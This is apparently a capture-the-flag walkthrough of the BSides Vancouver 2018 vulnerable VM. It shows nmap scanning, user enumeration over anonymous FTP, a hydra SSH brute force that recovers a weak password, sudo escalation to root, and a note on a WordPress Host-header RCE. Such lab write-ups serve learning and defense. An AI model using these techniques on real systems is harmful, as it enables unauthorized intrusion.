# BSides 2018 Vulnerable VM

The BSides Vancouver 2018 VM, which is available [here](https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/) was deceptively easy. Although there are multiple routes by which you can complete the VM - for the completionists amongst us - I would still definitely categorise it as a beginner's challenge. All in all, it took about 15-30 minutes to go from installation to the point where I was done with it.

## Getting Started

As always, my first step was to find the machine on my network with `netdiscover` and then run an NMap scan. I opted for a more complete scan to get a good picture of what I was dealing with:

`$ nmap -T5 -sV -O -sT 192.168.56.101`
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.5
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
```

Right off the bat, there are a lot of interesting services here. There are a plethora of vulnerabilities associated with the (outdated) software indicated by NMap's banner grabbing, but none of them seemed like an easy win. I opted instead to poke around the FTP and HTTP servers.

## The FTP Server

Running on VSFTPD, the FTP server on port 21 is a very simple installation. Access is anonymous-only, and the anonymous user has no ability to write files - as we would expect. However, the public folder contains a backup file, `users.txt.bk`, which gives us a list of users on the box. 

```
abatchy
john
mai
anne
doomguy
```

As I noted above, access to the FTP server is anonymous-only, so that leaves us with SSH or HTTP as the platform for these users. Although the robots.txt on the (blank) HTTP server did indicate the presence of a WordPress installation, I decided to give SSH a quick try before moving on.

## The SSH Server

It didn't take long to narrow down this user list. Of the five users given, all except `anne` do not support password authentication. Running `anne` against the rockyou password list with hydra produce a result within seconds:

```
[DATA] attacking ssh://192.168.56.101:22/
[22][ssh] host: 192.168.56.101   login: anne   password: princess
```

That was easy.

## Escalating to Root

```
$ ssh anne@192.168.56.101
anne@bsides2018:~$ sudo su
[sudo] password for anne:
root@bsides2018:/home/anne#
```

That *was* easy. For proof, here are the contents of `/root/flag.txt`:

```
Congratulations!

If you can read this, that means you were able to obtain root permissions on this VM.
You should be proud!

There are multiple ways to gain access remotely, as well as for privilege escalation.
Did you find them all?

@abatchy17
```

## Afterword

Since it was so easy, I decided to poke around a bit to find other ways to gain access. I'm sure there are more - LinEnum indicated a number of possible privesc flaws relating to file and folder permissions. A quick five minute search turned up the following:

* /backup_wordpress on the server is running an old and outdated version of WordPress, which is vulnerable to RCE via PHPMailer amongst other things. The RCE vulnerability is trivially exploited just by modifying your Host header when resetting a user's password.

* The wordpress installation can also be bruteforced fairly easily.
